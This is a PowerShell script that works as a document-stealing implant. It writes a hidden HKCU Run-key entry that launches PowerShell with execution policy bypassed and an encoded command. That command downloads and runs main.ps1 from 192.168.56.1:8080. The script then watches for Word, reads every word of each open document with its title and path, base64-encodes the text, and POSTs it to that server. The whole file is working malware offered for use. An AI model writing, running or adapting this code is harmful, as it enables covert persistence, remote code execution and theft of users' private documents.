$RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$ServerURL = "http://192.168.56.1:8080"
$Process = "Winword"


function Set-RegistryPersistence {
<#
.SYNOPSIS
Enables persistence through the registry HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
.PARAMETER Name
Indicates the name to configure the entry in the registry.
.PARAMETER Command
Indicates the command to run in the startup when user log in.
.EXAMPLE
Set-RegistryPersistence -Name "EntryName" -Command "ScriptToExecute"
#>

    Param (
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Command
    )

    New-ItemProperty -Path $RegistryPath -Name $Name -Value $Command -PropertyType String -Force | Out-Null
     
}

function Remove-RegistryPersistence {
<#
.SYNOPSIS
Remove persistence through the registry HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
.PARAMETER Name
Indicates the name of the registry entry to delete.
.EXAMPLE
Remove-LocalSecurityPolicy -Name "EntryToDelete".
#>

    Param (
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name
    )

    Remove-ItemProperty -Path $RegistryPath -Name $Name -Force | Out-Null
     
}


function Get-OpenWORDDocumentsWords {
<#
.SYNOPSIS
Retrieve all WinWords open documents, get the title, the document path and exfiltrates all written words in base64
.EXAMPLE
Get-OpenWordDocumentsWords -URL "http://evilurl.com"
.PARAMETER URL
Indicates the URL of the server to exfiltrate the data.
#>
    
    Param (       
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $URL
    )

    try {
        $WordDocuments = [Runtime.Interopservices.Marshal]::GetActiveObject('Word.Application')
    }
    catch {
    }
    finally {
        foreach ($WordDoc in $WordDocuments.Documents) {
            
            $Exfil = "##-BEGIN-##" + "`n" + $WordDoc.Name + "`n" + $WordDoc.FullName + "`n" + "Words:"
                    
            foreach ($Word in $WordDoc.Words) {
                if ($null -ne $Word.Text){
                    #clear non ascii chars
                    $Exfil += $Word.Text -replace '[^\x30-\x39\x41-\x5A\x61-\x7A]+', ''
                    $Exfil += " "
                }                
            }

            $Exfil += "`n" + "##-END-##"
            $b  = [System.Text.Encoding]::UTF8.GetBytes($Exfil)
            $EncodedData = [System.Convert]::ToBase64String($b)
            Invoke-Request -URL $URL -Body $EncodedData | Out-Null
        }
    }

    try {
        [Runtime.Interopservices.Marshal]::ReleaseComObject('Word.Application')
    }
    catch {
    }

}


function Invoke-Request {
<#
.SYNOPSIS
Make a POST Request to specified URL to exifltrate data.
.PARAMETER URL
Indicates the URL of the server to make the request.
.PARAMETER Body
Indicates the body of the request
.EXAMPLE
Invoke-Request -URL "ServerURL".
#>

    Param (
                        
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $URL,

        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Body

    )

    try {
        Invoke-WebRequest -Method 'Post' -Uri $URL -Body $Body
    }
    catch{
    }

}


function Wait-ProccessStarts {
<#
.SYNOPSIS
Wait until Get-Process returns a value for the indicated process name.
.PARAMETER Process
Indicates the process to check in Get-Process cmdlet.
.EXAMPLE
Wait-ProcessStarts -Process "ProcessName"
#>
    
    Param (
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Process
    )

    do {
        $Proc = Get-Process $Process -ErrorAction SilentlyContinue
        # Sleep 1 secs to not overload CPU
        Start-Sleep 1
        Write-Host "------------"
        Write-Host "Waiting Word starts"
        #Write-Host $Proc
        Write-Host "------------"
    } until ($Null -ne $Proc)
    
    Wait-ProccessStops -Process $Process

}


function Wait-ProccessStops {
<#
.SYNOPSIS
Wait until Get-Process returns a $null value for the indicated process name.
.PARAMETER Process
Indicates the process to check in Get-Process cmdlet.
.EXAMPLE
Wait-ProcessStops -Process "ProcessName"
#>
        
    Param (
        [Parameter(Mandatory = $true)]
        [String]
        [ValidateNotNullOrEmpty()]
        $Process
    )

    do {
        $Proc = Get-Process $Process -ErrorAction SilentlyContinue
        # Sleep 30 sec to not overload CPU and exfiltrate documents within this time interval
        Start-Sleep 30
        # Execute the exiltration
        Get-OpenWordDocumentsWords -URL $ServerURL
        Write-Host "------------"
        Write-Host "Waiting Word stops"
        Write-Host "------------"
    } until($Null -eq $Proc)

    Wait-ProccessStarts -Process $Process
    
}

function Start-Chaos {

    #Set-RegistryPersistence -Name "WinWord" -Command "powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"Get-Window powershell | Set-WindowState -Minimize; iex (iwr 'http://192.168.56.1:8080/main.ps1')`""
    Set-RegistryPersistence -Name "WinWord" -Command "powershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -WindowStyle Hidden -enc aQBlAHgAIAAoAGkAdwByACAAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADoAOAAwADgAMAAvAG0AYQBpAG4ALgBwAHMAMQAnACkA"
    Wait-ProccessStarts -Process $Process

}

Start-Chaos